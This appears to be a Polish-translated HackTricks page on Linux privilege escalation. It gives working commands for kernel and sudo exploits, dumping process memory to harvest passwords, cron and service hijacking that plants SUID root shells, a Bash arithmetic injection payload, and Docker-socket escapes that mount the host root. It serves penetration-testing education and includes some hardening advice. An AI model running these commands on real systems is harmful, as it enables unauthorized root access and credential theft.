# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy zdobywać informacje o działającym systemie.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze w zmiennej `PATH`** możesz przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernel oraz czy istnieje exploit, który można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder i kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploitów to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchomić na ofierze, sprawdza tylko exploity dla jądra 2.x)

Zawsze **wyszukaj wersję jądra w Google**, być może wersja twojego jądra jest wymieniona w jakimś kernel exploit i wtedy będziesz pewien, że exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji Sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja sygnatury nie powiodła się

Sprawdź **smasher2 box of HTB** jako **przykład**, jak ta vuln mogła zostać wykorzystana
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wypisz możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli znajdujesz się wewnątrz docker container możesz spróbować się z niego wydostać:

{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować je zamontować i sprawdzić, czy nie ma tam prywatnych informacji
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wypisz przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Również sprawdź, czy **jakikolwiek kompilator jest zainstalowany**. Jest to przydatne, jeśli potrzebujesz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go używać (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może jest jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Zauważ, że te polecenia pokażą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którąkolwiek z zainstalowanych wersji oprogramowania da się wykorzystać za pomocą znanych exploitów_

## Procesy

Sprawdź, jakie **procesy** są uruchamiane i zweryfikuj, czy któryś proces nie posiada **więcej uprawnień niż powinien** (może tomcat uruchomiony przez roota?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie działają [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Również **sprawdź swoje uprawnienia do binarek procesów**, może będziesz mógł nadpisać którąś z nich.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów uruchamianych często lub gdy spełniony jest zestaw wymagań.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials in clear text inside the memory**.\
Zazwyczaj będziesz potrzebować **root privileges**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego zwykle jest to bardziej przydatne, gdy już masz uprawnienia roota i chcesz odkryć więcej credentials.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz czytać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Zauważ, że obecnie większość maszyn **nie zezwala na ptrace domyślnie**, co oznacza, że nie możesz zrzucać innych procesów należących do twojego nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać Heap i przeszukać go w poszukiwaniu credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazują, jak pamięć jest mapowana w przestrzeni adresowej tego procesu**; pokazują też **uprawnienia każdego zmapowanego regionu**. Pseudoplik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** i ich offsety. Wykorzystujemy te informacje, aby **przesunąć wskaźnik w pliku mem i zrzucić wszystkie czytelne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **pamięci fizycznej** systemu, a nie do pamięci wirtualnej. Do wirtualnej przestrzeni adresowej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump to wersja narzędzia ProcDump dla Linux, będąca reinterpretacją klasycznego narzędzia ProcDump z pakietu Sysinternals dla Windows. Pobierz ją z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania roota i zrzucić proces należący do ciebie
- Script A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby dump the memory of a process) i przeszukać memory w poszukiwaniu credentials:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **kraść poświadczenia w postaci czystego tekstu z pamięci** oraz z niektórych **znanych plików**. Wymaga uprawnień root, aby działać prawidłowo.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Wyszukiwanie regexów/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Jeśli panel webowy “Crontab UI” (alseambusher/crontab-ui) działa jako root i nasłuchuje tylko na loopback, nadal możesz się do niego dostać przez SSH local port-forwarding i utworzyć privileged job, aby eskalować uprawnienia.

Typowy przebieg
- Odkryj port dostępny tylko z loopback (np. 127.0.0.1:8000) i Basic-Auth realm za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
- Kopie zapasowe/skrypty zawierające `zip -P <password>`
- jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie o wysokich uprawnieniach i uruchom je natychmiast (tworzy SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Wzmacnianie bezpieczeństwa
- Nie uruchamiaj Crontab UI jako root; ogranicz go do dedykowanego użytkownika i minimalnych uprawnień
- Nasłuchuj na localhost i dodatkowo ogranicz dostęp za pomocą firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w unit files; używaj secret stores lub root-only EnvironmentFile
- Włącz audit/logging dla wykonywania zadań na żądanie

Sprawdź, czy którekolwiek zaplanowane zadanie jest podatne. Być może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? czy możesz modyfikować pliki, których używa root? użyć symlinks? utworzyć konkretne pliki w katalogu, z którego korzysta root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na przykład, w pliku _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma prawa zapisu do /home/user_)

Jeśli w tym crontabie użytkownik root próbuje wykonać jakąś komendę lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron uruchamiający skrypt zawierający wildcard (Wildcard Injection)

Jeśli skrypt uruchamiany przez root ma “**\***” w poleceniu, możesz to wykorzystać do wykonania nieoczekiwanych rzeczy (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeżeli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej sztuczek związanych z exploitacją wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter/variable expansion oraz command substitution przed oceną arytmetyczną w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje pola logów kontrolowane przez nieufne źródło i przekazuje je do kontekstu arytmetycznego, atakujący może wstrzyknąć command substitution $(...), który wykona się jako root, gdy cron zostanie uruchomiony.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacja: Spraw, aby tekst kontrolowany przez atakującego został zapisany w parsowanym logu tak, by pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoje polecenie nie wypisuje nic na stdout (lub przekieruj jego wyjście), aby arytmetyka pozostała poprawna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Jeśli możesz **zmodyfikować cron script** uruchamiany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli script uruchamiany przez root używa **directory where you have full access**, może być przydatne usunąć ten folder i **create a symlink folder to another one**, który będzie serwował script kontrolowany przez Ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste cron jobs

Możesz monitorować procesy, by znaleźć takie, które są wykonywane co 1, 2 lub 5 minut. Możesz to wykorzystać i eskalować uprawnienia.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według najmniej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (narzędzie to będzie monitorować i wypisywać wszystkie procesy, które się uruchamiają).

### Niewidoczne cron jobs

Możliwe jest utworzenie cronjobu **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii), a cron job nadal będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z prawem zapisu

Sprawdź, czy możesz zapisać dowolny plik `.service`, jeśli tak, możesz go **zmodyfikować** tak, aby **uruchamiał** Twój **backdoor** gdy usługa jest **uruchomiona**, **zrestartowana** lub **zatrzymana** (może będziesz musiał poczekać aż maszyna się zrestartuje).\
Na przykład utwórz swój backdoor wewnątrz pliku .service z **`ExecStart=/tmp/script.sh`**

### Zapisywalne binaria usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmodyfikować tak, aby zawierały backdoors, dzięki czemu po ponownym uruchomieniu usług backdoors zostaną wykonane.

### systemd PATH - ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli stwierdzisz, że możesz **write** w którymkolwiek z folderów na ścieżce, możesz być w stanie **escalate privileges**. Musisz szukać plików konfiguracji usług używających **relative paths being used on service configurations**, takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny plik** o **tej samej nazwie co relative path binary** w katalogu PATH systemd, do którego możesz zapisywać, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twój **backdoor zostanie wykonany** (użytkownicy bez uprawnień zwykle nie mogą startować/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowaną obsługę zdarzeń kalendarzowych i zdarzeń monotonicznych oraz mogą działać asynchronicznie.

Możesz wyświetlić wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi on niektóre jednostki systemd.unit (takie jak `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

W związku z tym, aby wykorzystać to uprawnienie musiałbyś:

- Znaleźć jakiś systemd unit (np. `.service`), który **uruchamia zapisywalny plik binarny**
- Znaleźć jakiś systemd unit, który **uruchamia względną ścieżkę** i nad którym masz **uprawnienia zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie Timera**

Aby włączyć timer potrzebujesz uprawnień root i wykonania:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Uwaga: **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane przez pliki `.socket`.

Gniazda można konfigurować przy użyciu plików `.socket`.

**Dowiedz się więcej o gniazdach za pomocą `man systemd.socket`.** Wewnątrz tego pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się, ale w skrócie służą do **wskazania, gdzie będą nasłuchiwać** na gniazdo (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania, itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, dla każdego przychodzącego połączenia tworzona jest **instancja usługi**, i jedynie gniazdo połączenia jest jej przekazywane. Jeśli **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki serwisowej**, i tworzona jest tylko jedna jednostka serwisowa dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie pojedyncza jednostka serwisowa bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zalecane jest pisanie nowych daemonów w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **gniazd**/FIFO, odpowiednio. Pierwszy token linii poleceń musi być bezwzględną ścieżką pliku wykonywalnego, po którym następują argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **gniazd**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla gniazd z Accept=no. Domyślnie wskazuje usługę o tej samej nazwie co socket (z zamienionym sufiksem). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Zapisowalne .socket files

Jeśli znajdziesz **zapisowalny** `.socket` plik możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie uruchomiony przed utworzeniem socketu. W związku z tym **prawdopodobnie będziesz musiał poczekać na restart maszyny.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Zapisowalne gniazda

Jeśli **zidentyfikujesz jakiekolwiek zapisywalne gniazdo** (_mówimy tu teraz o Unix Sockets i nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać podatność.

### Enumeracja Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że może istnieć kilka **sockets listening for HTTP** requests (_Nie mam na myśli .socket files, lecz plików działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądania HTTP**, możesz z nim **komunikować się** i być może **wykorzystać jakąś lukę**.

### Zapisalny socket Dockera

Socket Dockera, często znajdujący się pod `/var/run/docker.sock`, to krytyczny plik, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` oraz członków grupy `docker`. Posiadanie dostępu zapisu do tego socketu może prowadzić do eskalacji uprawnień. Poniżej znajduje się opis, jak można to zrobić oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp zapisu do socketu Dockera, możesz eskalować uprawnienia, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z uprawnieniami roota do systemu plików hosta.

#### **Korzystanie bezpośrednio z Docker API**

Jeśli Docker CLI nie jest dostępny, Docker socket można nadal obsłużyć za pomocą Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który montuje katalog główny hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po nawiązaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z uprawnieniami roota do systemu plików hosta.

### Inne

Zauważ, że jeśli masz prawa zapisu do docker socket ponieważ jesteś **w grupie `docker`** to masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API nasłuchuje na porcie** możesz także być w stanie go przejąć](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z docker lub wykorzystanie go do eskalacji uprawnień** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacja uprawnień

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać je do eskalacji uprawnień**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacja uprawnień

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następującą stronę — **możesz być w stanie wykorzystać je do eskalacji uprawnień**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system **inter-Process Communication (IPC)**, który umożliwia aplikacjom efektywną interakcję i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, obsługuje podstawową IPC, która poprawia wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając płynną integrację między komponentami systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, usprawniając procesy, które wcześniej były skomplikowane.

